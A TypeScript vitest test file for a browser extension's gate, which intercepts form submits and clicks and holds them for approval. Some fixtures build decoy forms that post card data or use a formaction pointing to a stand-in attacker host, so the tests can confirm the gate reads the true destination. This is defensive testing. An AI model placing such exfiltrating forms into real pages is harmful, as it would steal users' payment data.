// @vitest-environment happy-dom
/**
 * The gate in a DOM (happy-dom): forms in open shadow roots (B1), clobbered form properties (I2), a listener that
 * throws (I2, fails closed), and the notice host (m1).
 */
import { afterEach, describe, expect, it, vi } from "vitest";
import type { InPageAction } from "../shared/messages.js";
import { createActionGate, type ActionGate } from "./gate.js";
import { APPROVAL_TTL_MS } from "../engine/bindings.js";
import { buildActivate, buildSubmit, fieldsOf } from "./gate-dom.js";
import { createNotice } from "./gate-notice.js";
import type { ContentDeps } from "./types.js";

interface Sent {
  type: string;
  action?: InPageAction;
}

function fakeWin(url = "https://shop.test/settings/security"): Window {
  const loc = new URL(url);
  const location = { href: loc.href, hostname: loc.hostname, origin: loc.origin };
  return new Proxy(window, {
    get(target, prop) {
      if (prop === "location") return location;
      const v = Reflect.get(target, prop, target) as unknown;
      return typeof v === "function" && !/^[A-Z]/.test(String(prop)) ? (v as (...a: unknown[]) => unknown).bind(target) : v;
    },
  }) as Window;
}

let gate: ActionGate | null = null;

function setup(): Sent[] {
  const sent: Sent[] = [];
  const deps: ContentDeps = {
    win: fakeWin(),
    agentMode: () => false,
    // The worker never answers the posture (it stays null: every classified action is held and asked about).
    send: ((m: Sent) => {
      sent.push(m);
      return new Promise(() => undefined);
    }) as ContentDeps["send"],
  };
  gate = createActionGate(deps);
  gate.install();
  return sent;
}

afterEach(() => {
  gate?.uninstall();
  gate = null;
  document.body.innerHTML = "";
});

const NEW_PASSWORD_FORM = `<form action="https://shop.test/account/password" method="post"><input type="password" name="pw" autocomplete="new-password" value="hunter22-new"><button type="submit">Change password</button></form>`;
const tick = () => new Promise((r) => setTimeout(r, 0));

describe("B1: a form in an open shadow root", () => {
  it("is held on submit, though submit never leaves the shadow root", async () => {
    const sent = setup();
    const host = document.createElement("div");
    document.body.append(host);
    host.attachShadow({ mode: "open" }).innerHTML = NEW_PASSWORD_FORM;
    await tick(); // the document observer finds the new root
    const form = (host.shadowRoot as ShadowRoot).querySelector("form") as HTMLFormElement;
    const submit = new Event("submit", { bubbles: true, cancelable: true });
    form.dispatchEvent(submit);
    expect(submit.defaultPrevented).toBe(true);
    const check = sent.find((m) => m.type === "action.check");
    expect(check?.action?.kind).toBe("submit");
    expect(check?.action?.elementPath).toContain(">>");
  });
});

describe("I2: clobbered form properties", () => {
  it("buildSubmit reads the real action, method and controls", () => {
    document.body.innerHTML = `<form action="https://attacker.test/collect" method="post"><input name="action" value="https://shop.test/"><input name="method" value="get"><input name="card" value="x"></form>`;
    const form = document.querySelector("form") as HTMLFormElement;
    const decoy = form.querySelector('input[name="action"]');
    // (happy-dom's forms are proxies over their named controls and may refuse some of these; Reflect does not throw.)
    Reflect.defineProperty(form, "action", { value: decoy });
    Reflect.defineProperty(form, "method", { value: form.querySelector('input[name="method"]') });
    Reflect.defineProperty(form, "elements", { value: [] });
    expect(form.action).not.toBe("https://attacker.test/collect");
    const s = buildSubmit(form, null, fakeWin());
    expect(s.form.targetUrl).toBe("https://attacker.test/collect");
    expect(s.form.method).toBe("post");
    expect(fieldsOf(form).map((f) => f.name)).toEqual(["action", "method", "card"]);
  });

  it("a submitter's own formaction counts, and its absence does not fall back to the page URL", () => {
    document.body.innerHTML = `<form action="https://shop.test/save"><button id="a" formaction="https://attacker.test/x">A</button><button id="b">B</button></form>`;
    const form = document.querySelector("form") as HTMLFormElement;
    expect(buildSubmit(form, document.getElementById("a"), fakeWin()).form.targetUrl).toBe("https://attacker.test/x");
    expect(buildSubmit(form, document.getElementById("b"), fakeWin()).form.targetUrl).toBe("https://shop.test/save");
  });

  it("a listener that throws fails closed: the submit is cancelled and the worker is told", () => {
    const sent = setup();
    document.body.innerHTML = NEW_PASSWORD_FORM;
    const pw = document.querySelector("input") as HTMLInputElement;
    Object.defineProperty(pw, "value", {
      get() {
        throw new Error("page broke this");
      },
    });
    const submit = new Event("submit", { bubbles: true, cancelable: true });
    (document.querySelector("form") as HTMLFormElement).dispatchEvent(submit);
    expect(submit.defaultPrevented).toBe(true);
    expect(sent.find((m) => m.type === "action.check")?.action).toMatchObject({ kind: "activate", role: "unchecked", tag: "submit" });
  });
});

describe("a click on a form control carries where its form posts", () => {
  it("the form's action and method, or the control's own formaction and formmethod", () => {
    document.body.innerHTML = `<form action="https://shop.test/save" method="post"><button id="a" type="submit">A</button><button id="b" formaction="https://attacker.test/x" formmethod="get">B</button></form><a id="l" href="https://shop.test/x">x</a>`;
    const ctxOf = (id: string) => buildActivate(document.getElementById(id) as Element, fakeWin()).context.formTarget;
    expect(ctxOf("a")).toEqual({ url: "https://shop.test/save", method: "post" });
    expect(ctxOf("b")).toEqual({ url: "https://attacker.test/x", method: "get" });
    expect(ctxOf("l")).toBeUndefined();
  });
});

describe("an approval that is never answered", () => {
  it("lets go of the control when the worker's time limit passes, so the next attempt is checked again", async () => {
    vi.useFakeTimers();
    try {
      const sent: Sent[] = [];
      const deps: ContentDeps = {
        win: fakeWin(),
        agentMode: () => false,
        send: ((m: Sent) => {
          sent.push(m);
          if (m.type === "action.check") return Promise.resolve({ decision: { verdict: "approve", rule: "gate.always_on", actionClass: "account_security", reasons: [] }, approvalId: "a1" });
          return Promise.resolve({ agentMode: false, quarantined: false });
        }) as ContentDeps["send"],
      };
      gate = createActionGate(deps);
      gate.install();
      document.body.innerHTML = NEW_PASSWORD_FORM;
      const form = document.querySelector("form") as HTMLFormElement;
      const fire = () => form.dispatchEvent(new Event("submit", { bubbles: true, cancelable: true }));
      const checks = () => sent.filter((m) => m.type === "action.check").length;
      fire();
      await vi.advanceTimersByTimeAsync(0);
      expect(checks()).toBe(1);
      fire(); // still held: no second approval
      await vi.advanceTimersByTimeAsync(0);
      expect(checks()).toBe(1);
      await vi.advanceTimersByTimeAsync(APPROVAL_TTL_MS + 2000);
      fire();
      await vi.advanceTimersByTimeAsync(0);
      expect(checks()).toBe(2);
    } finally {
      vi.useRealTimers();
    }
  });
});

describe("m1: the gate's notice host", () => {
  it("is a plain div with a random attribute name", () => {
    const n = createNotice(document);
    n.show("waiting", "payment");
    const host = document.body.lastElementChild as Element;
    expect(host.tagName).toBe("DIV");
    expect(host.getAttributeNames().join(" ")).not.toMatch(/launchsafe/i);
    n.remove();
  });
});
